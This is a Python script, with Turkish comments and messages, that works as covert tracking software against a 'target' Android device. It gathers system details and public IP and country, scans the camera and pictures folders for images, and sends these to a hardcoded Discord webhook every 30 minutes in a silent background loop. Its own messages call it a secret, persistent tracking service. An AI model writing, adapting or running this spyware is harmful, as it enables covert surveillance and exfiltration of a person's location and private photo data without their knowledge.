import os
import platform
import requests
import json
from datetime import datetime
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1494603362992263198/jTeEkH7_1QWR4U97Mro4PsjDwHHUf-nwAzlGuFPr04O41YLnFd0O89V69Tr5va2VA-GD"

def send_intel():
    try:
        sys_info = {
            "system": platform.system(),
            "release": platform.release(),
            "machine": platform.machine()
        }
        ip_data = {}
        try:
            res = requests.get('https://ipapi.co/json/', timeout=5)
            ip_data = res.json()
        except:
            pass

        # Hedef cihazdaki olası medya yolları taraması
        images_found = []
        possible_paths = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/"]
        for path in possible_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                            images_found.append(os.path.join(root, file))

        sample_files = images_found[:5] if images_found else ["Medya bulunamadı"]

        payload = {
            "content": "🚨 **Gizli Takip Servisi Tetiklendi!**",
            "embeds": [{
                "title": "📱 Kalıcı Takip - Durum Raporu",
                "color": 16711680,
                "fields": [
                    {"name": "Cihaz Bilgisi", "value": f"`{sys_info['system']} {sys_info['release']} - {sys_info['machine']}`", "inline": False},
                    {"name": "IP / Konum", "value": f"`{ip_data.get('ip', 'Bilinmiyor')} | {ip_data.get('country', '?')}`", "inline": True},
                    {"name": "Bulunan Görsel Sayısı", "value": f"`{len(images_found)} adet`", "inline": True},
                    {"name": "Örnek Dosyalar", "value": f"```{'\\n'.join(sample_files)}```", "inline": False}
                ],
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=5)

    except Exception as e:
        pass

if __name__ == "__main__":
    # Arka planda periyodik olarak çalışması için döngü (Örn: Her 30 dakikada bir rapor gönderir)
    while True:
        send_intel()
        time.sleep(1800) # 30 dakika
